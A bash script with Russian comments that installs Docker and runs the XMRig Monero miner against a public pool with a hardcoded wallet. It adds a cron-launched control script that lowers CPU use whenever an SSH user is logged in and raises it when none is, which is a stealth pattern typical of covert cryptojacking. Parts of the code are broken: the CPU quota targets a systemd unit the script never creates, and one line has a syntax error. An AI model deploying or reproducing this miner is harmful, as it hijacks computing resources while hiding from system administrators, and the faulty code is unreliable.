#!/bin/bash

# Задаем переменные
XMRIG_VERSION="6.15.0"
XMRIG_DIR="/usr/local/xmrig"
XMRIG_BIN="$XMRIG_DIR/xmrig"
POOL="pool.supportxmr.com:3333"
WALLET="467i7PYq63KSkgCq8TyuWpRyruY8fipyu9hnBgvCPCMXhLmT1Nepb3p2grsi12aHEg9Fosn4YypzdH3LMFZ1EjQWS8MtkPJ"
CONTROL_SCRIPT="/usr/local/bin/xmrig_control.sh"
CONFIG_FILE="/etc/xmrig/config.json"
NUM_WORKERS=8
MSR_PACKAGE="msr-tools"

# Определение количества ядер
NUM_CORES=$(nproc)

# Проверка поддержки MSR
echo "Проверка поддержки MSR..."
if ! lsmod | grep -q msr; then
    echo -e "\033[34mMSR не поддерживается или не загружен в текущей системе.\033[0m"
else
    echo "Установка и настройка MSR..."
    if ! sudo apt-get install -y $MSR_PACKAGE; then
        echo -e "\033[31mНе удалось установить $MSR_PACKAGE. Продолжаем установку XMRig...\033[0m"
    else
        sudo modprobe msr
        echo "MSR установлен и загружен."
    fi
fi

# Установка Docker
echo "Установка Docker..."
if ! sudo apt-get update; then
    echo -e "\033[31mНе удалось обновить списки пакетов.\033[0m"
fi

if ! sudo apt-get install -y apt-transport-https ca-certificates curl software-properties-common; then
    echo -e "\033[31mНе удалось установить зависимости для Docker.\033[0m"
fi

if ! curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -; then
    echo -e "\033[31mНе удалось добавить ключ Docker.\033[0m"
fi

if ! sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"; then
    echo -e "\033[31mНе удалось добавить репозиторий Docker.\033[0m"
fi

if ! sudo apt-get update; then
    echo -e "\033[31mНе удалось обновить списки пакетов после добавления репозитория Docker.\033[0m"
fi

if ! sudo apt-get install -y docker-ce; then
    echo -e "\033[31mНе удалось установить Docker.\033[0m"
fi

# Запуск и проверка Docker
if ! sudo systemctl start docker; then
    echo -e "\033[31mНе удалось запустить Docker.\033[0m"
fi

if ! sudo systemctl enable docker; then
    echo -e "\033[31mНе удалось включить Docker на автозагрузку.\033[0m"
fi

if ! docker --version; then
    echo -e "\033[31mНе удалось проверить версию Docker.\033[0m"
fi

# Установка Docker Compose
echo "Установка Docker Compose..."
DOCKER_COMPOSE_VERSION="1.29.2"
if ! sudo curl -L "https://github.com/docker/compose/releases/download/$DOCKER_COMPOSE_VERSION/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose; then
    echo -e "\033[31mНе удалось загрузить Docker Compose.\033[0m"
fi

if ! sudo chmod +x /usr/local/bin/docker-compose; then
    echo -e "\033[31mНе удалось установить права на выполнение для Docker Compose.\033[0m"
fi

if ! docker-compose --version; then
    echo -e "\033[31mНе удалось проверить версию Docker Compose.\033[0m"
fi

# Создание Dockerfile для XMRig
echo "Создание Dockerfile..."
DOCKERFILE_PATH="/tmp/Dockerfile"
cat <<EOF | sudo tee $DOCKERFILE_PATH
FROM ubuntu:20.04

# Установка зависимостей
RUN apt-get update && apt-get install -y wget tar

# Загрузка и установка XMRig
RUN wget https://github.com/xmrig/xmrig/releases/download/v$XMRIG_VERSION/xmrig-$XMRIG_VERSION-linux-x64.tar.gz -O /tmp/xmrig.tar.gz && \
    tar -xzf /tmp/xmrig.tar.gz -C /opt && \
    mv /opt/xmrig-$XMRIG_VERSION/xmrig /usr/local/bin/xmrig && \
    chmod +x /usr/local/bin/xmrig && \
    rm -rf /tmp/xmrig*

# Копирование конфигурационного файла
COPY config.json /etc/xmrig/config.json

# Запуск XMRig
CMD ["xmrig", "--config", "/etc/xmrig/config.json"]
EOF

# Создание конфигурационного файла для XMRig
echo "Создание конфигурационного файла для XMRig..."
sudo mkdir -p /etc/xmrig
cat <<EOF | sudo tee $CONFIG_FILE
{
  "autosave": true,
  "cpu": {
    "enabled": true,
    "threads": $NUM_CORES
  },
  "pools": [
    $(for i in $(seq 1 $NUM_WORKERS); do
        echo -n "{
          \"url\": \"$POOL\",
          \"user\": \"$WALLET.worker$i\",
          \"pass\": \"x\",
          \"coin\": \"monero\"
        }"
        [[ $i -lt $NUM_WORKERS ]] && echo -n ","
      done)
  ],
  "api": {
    "enabled": false,
    "port": 0
  }
}
EOF

# Построение Docker-образа
echo "Построение Docker-образа для XMRig..."
if ! sudo docker build -t xmrig-image -f $DOCKERFILE_PATH /tmp; then
    echo -e "\033[31mНе удалось построить Docker-образ для XMRig.\033[0m"
fi

# Запуск контейнера XMRig
echo "Запуск контейнера XMRig..."
if ! sudo docker run -d --name xmrig-container xmrig-image; then
    echo -e "\033[31mНе удалось запустить контейнер XMRig.\033[0m"
fi

# Проверка состояния контейнера
echo "Проверка состояния контейнера..."
if ! sudo docker ps -a; then
    echo -e "\033[31mНе удалось получить состояние контейнеров Docker.\033[0m"
fi

# Создание скрипта для управления нагрузкой XMRig в зависимости от SSH-подключений
echo "Создание скрипта управления XMRig..."
cat <<EOF | sudo tee $CONTROL_SCRIPT
#!/bin/bash

# Функция для обновления CPUQuota в зависимости от количества SSH-подключений
update_cpu_quota() {
    ssh_connections=\$(who | grep -c "ssh")
    if [ \$ssh_connections -gt 0 ]; then
        sudo systemctl set-property --runtime -- xmrig.service CPUQuota=30%
    else
        sudo systemctl set-property --runtime -- xmrig.service CPUQuota=90%
    fi
}

# Бесконечный цикл для проверки каждые 60 секунд
while true; do
    update_cpu_quota
    sleep 60
done
EOF

# Делаем скрипт исполняемым
if ! sudo chmod +x $CONTROL_SCRIPT; then
    echo -e "\033[31mНе удалось сделать скрипт управления XMRig исполняемым.\033[0m"
fi

# Добавление скрипта в автозагрузку через crontab
if ! (crontab -l 2>/dev/null; echo "@reboot $CONTROL_SCRIPT") | crontab -; then
    echo -e "\033[31mНе удалось добавить скрипт управления XMRig в автозагрузку.\033[0m"
fi

# Запуск скрипта управления XMRig
if ! $CONTROL_SCRIPT &; then
    echo -e "\033[31mНе удалось запустить скрипт управления XMRig.\033[0m"
fi

echo "Установка и настройка завершены."
